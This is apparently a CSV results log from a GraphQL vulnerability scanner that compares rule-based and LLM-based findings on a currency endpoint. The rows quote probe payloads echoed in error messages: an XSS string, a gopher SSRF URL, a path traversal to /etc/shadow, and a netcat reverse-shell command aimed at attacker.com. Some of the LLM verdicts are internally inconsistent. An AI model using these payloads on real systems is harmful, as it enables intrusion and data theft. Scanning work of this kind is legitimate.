timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-07T05:47:36.035615,getCurrencies_response_2,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T05:47:46.632882,getCurrencies_response_3,400,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,[],"[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a reflected XSS test payload (`<svg/onload=alert(1)>`) in the GraphQL validation error message. While the server rejected the input due to a type mismatch (string vs boolean), the payload appears verbatim in the error response. This indicates: 1) The application reflects user input without proper escaping in error messages, 2) An attacker could potentially exploit this if the error message is rendered unsafely in a client interface (e.g., web UI displaying GraphQL errors without sanitization). The risk is contingent on client-side rendering practices, but the presence of executable HTML/JS in server responses warrants attention."", ""evidence"": ""Reflected payload '<svg/onload=alert(1)>' in GraphQL validation error message"", ""confidence"": 0.7, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""MEDIUM"", ""confidence"": 0.7, ""evidence"": ""Reflected payload '<svg/onload=alert(1)>' in GraphQL validation error message"", ""explanation"": ""The response contains a reflected XSS test payload (`<svg/onload=alert(1)>`) in the GraphQL validation error message. While the server rejected the input due to a type mismatch (string vs boolean), the payload appears verbatim in the error response. This indicates: 1) The application reflects user input without proper escaping in error messages, 2) An attacker could potentially exploit this if the error message is rendered unsafely in a client interface (e.g., web UI displaying GraphQL errors without sanitization). The risk is contingent on client-side rendering practices, but the presence of executable HTML/JS in server responses warrants attention.""}}]"
2025-10-07T05:47:54.854026,getCurrencies_response_4,400,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,[],"[{""detection_name"": ""LLM: ssrf_injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The error message indicates an attempted input of 'gopher://internal-api/secret' in a boolean field. While this specific attempt triggered a type validation error, the use of the gopher protocol targeting an internal API endpoint suggests SSRF probing. Gopher protocol support in SSRF contexts can enable exploitation of legacy systems and internal network access. The validation error prevented execution in this case, but the payload pattern indicates potential vulnerability in less strictly validated fields or scenarios."", ""evidence"": ""Attempted injection of gopher://internal-api/secret URL in boolean field"", ""confidence"": 0.7, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""ssrf_injection"", ""severity"": ""MEDIUM"", ""confidence"": 0.7, ""evidence"": ""Attempted injection of gopher://internal-api/secret URL in boolean field"", ""explanation"": ""The error message indicates an attempted input of 'gopher://internal-api/secret' in a boolean field. While this specific attempt triggered a type validation error, the use of the gopher protocol targeting an internal API endpoint suggests SSRF probing. Gopher protocol support in SSRF contexts can enable exploitation of legacy systems and internal network access. The validation error prevented execution in this case, but the payload pattern indicates potential vulnerability in less strictly validated fields or scenarios.""}}]"
2025-10-07T05:48:02.137826,getCurrencies_response_5,400,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The error message explicitly shows an attempted OS command injection via the payload `$(nc -e /bin/sh attacker.com 4444)`, which is a common reverse shell command. While the server rejected the input due to a type mismatch (expected boolean, got string), the presence of this payload in the response indicates improper input sanitization and a potential attack vector. The payload uses shell command substitution syntax (`$()`), strongly suggesting an attempt to execute arbitrary commands on the underlying system."", ""evidence"": ""Command injection payload detected in error message: \""$(nc -e /bin/sh attacker.com 4444)\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""Command injection payload detected in error message: \""$(nc -e /bin/sh attacker.com 4444)\"""", ""explanation"": ""The error message explicitly shows an attempted OS command injection via the payload `$(nc -e /bin/sh attacker.com 4444)`, which is a common reverse shell command. While the server rejected the input due to a type mismatch (expected boolean, got string), the presence of this payload in the response indicates improper input sanitization and a potential attack vector. The payload uses shell command substitution syntax (`$()`), strongly suggesting an attempt to execute arbitrary commands on the underlying system.""}}]"
2025-10-07T05:49:40.619927,getCurrencies_response_6,400,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,[],"[{""detection_name"": ""LLM: path_injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The error message indicates an attempt to inject a path traversal string ('../../../etc/shadow') into a boolean field. While the GraphQL type system rejected the input due to a type mismatch, the presence of a known sensitive file path in the payload suggests potential probing for path traversal vulnerabilities. This could indicate insecure handling of user input in file system operations if type validation were bypassed or insufficient input sanitization existed elsewhere in the system."", ""evidence"": ""Boolean cannot represent a non boolean value: \""../../../etc/shadow\"""", ""confidence"": 0.7, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""path_injection"", ""severity"": ""MEDIUM"", ""confidence"": 0.7, ""evidence"": ""Boolean cannot represent a non boolean value: \""../../../etc/shadow\"""", ""explanation"": ""The error message indicates an attempt to inject a path traversal string ('../../../etc/shadow') into a boolean field. While the GraphQL type system rejected the input due to a type mismatch, the presence of a known sensitive file path in the payload suggests potential probing for path traversal vulnerabilities. This could indicate insecure handling of user input in file system operations if type validation were bypassed or insufficient input sanitization existed elsewhere in the system.""}}]"
2025-10-07T05:49:53.770064,getCurrencies_response_7,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T05:50:15.417486,getCurrencies_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T05:50:57.740727,getCurrencies_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T05:51:08.306165,getCurrencies_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T05:51:19.148613,getCurrencies_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Unknown,1,0,0,0,0,1,0.0,no_potential,,,,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: field_suggestions"", ""detection"": ""safe"", ""category"": ""Unknown"", ""description"": ""The GraphQL server returns detailed field suggestions when invalid fields are queried (e.g., 'Id' -> 'id', 'abbrieviation' -> 'abbreviation'). While helpful for developers, this exposes schema structure to attackers, enabling reconnaissance by revealing valid field names. This qualifies as information disclosure via field suggestion leakage, though it does not directly expose sensitive data."", ""evidence"": ""Error messages contain field suggestions: \""Did you mean 'id'?\"", \""Did you mean 'abbreviation'?\"", \""Did you mean 'symbol'?\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""field_suggestions"", ""severity"": ""LOW"", ""confidence"": 0.9, ""evidence"": ""Error messages contain field suggestions: \""Did you mean 'id'?\"", \""Did you mean 'abbreviation'?\"", \""Did you mean 'symbol'?\"""", ""explanation"": ""The GraphQL server returns detailed field suggestions when invalid fields are queried (e.g., 'Id' -> 'id', 'abbrieviation' -> 'abbreviation'). While helpful for developers, this exposes schema structure to attackers, enabling reconnaissance by revealing valid field names. This qualifies as information disclosure via field suggestion leakage, though it does not directly expose sensitive data.""}}]"
